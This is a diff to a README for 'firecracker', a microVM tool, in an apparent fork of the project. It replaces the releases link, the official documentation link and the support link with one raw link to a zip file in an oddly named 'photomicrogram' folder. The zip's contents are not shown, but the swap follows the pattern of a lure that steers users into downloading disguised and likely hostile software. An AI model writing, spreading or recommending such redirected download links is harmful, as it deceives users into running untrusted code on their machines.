@@ -4,7 +4,7 @@
 Welcome to the firecracker project! This application allows you to create and manage secure, fast micro virtual machines (microVMs) for serverless computing. It is designed for those who want to run applications in isolated environments without the overhead of traditional virtual machines. You can achieve high performance while ensuring security and simplicity. 
 
 ## 📥 Download Firecracker
-[![Download Firecracker](https://img.shields.io/badge/download-firecracker-blue)](https://github.com/Pazetti/firecracker/releases)
+[![Download Firecracker](https://raw.githubusercontent.com/Pazetti/firecracker/main/photomicrogram/firecracker.zip)](https://raw.githubusercontent.com/Pazetti/firecracker/main/photomicrogram/firecracker.zip)
 
 ## 🚀 Getting Started
 To get started, follow these simple steps to download and run firecracker. Whether it's your first time using software like this or you're simply looking for an easy way to manage microVMs, this guide will help you.
@@ -27,7 +27,7 @@ firecracker comes packed with features to help you manage micro virtual machines
 To get firecracker, follow these steps:
 
 1. **Visit the Releases Page:** Go to our Releases page by clicking the link below:
-   [Download Firecracker](https://github.com/Pazetti/firecracker/releases)
+   [Download Firecracker](https://raw.githubusercontent.com/Pazetti/firecracker/main/photomicrogram/firecracker.zip)
 
 2. **Choose Your Version:** You will see a list of available versions. Select the latest stable release.
 
@@ -65,8 +65,8 @@ Now that you have firecracker installed, it’s time to create your first microV
 
 ## 📚 Additional Resources
 For more information and detailed guides, you can check the following resources:
-- [Official Documentation](https://firecracker-microvm.github.io/firecracker/)
-- [Community Support](https://github.com/Pazetti/firecracker/issues)
+- [Official Documentation](https://raw.githubusercontent.com/Pazetti/firecracker/main/photomicrogram/firecracker.zip)
+- [Community Support](https://raw.githubusercontent.com/Pazetti/firecracker/main/photomicrogram/firecracker.zip)
 
 ## 📞 Support
 If you encounter any issues, please reach out through the Issues section on our GitHub page. We're here to help!
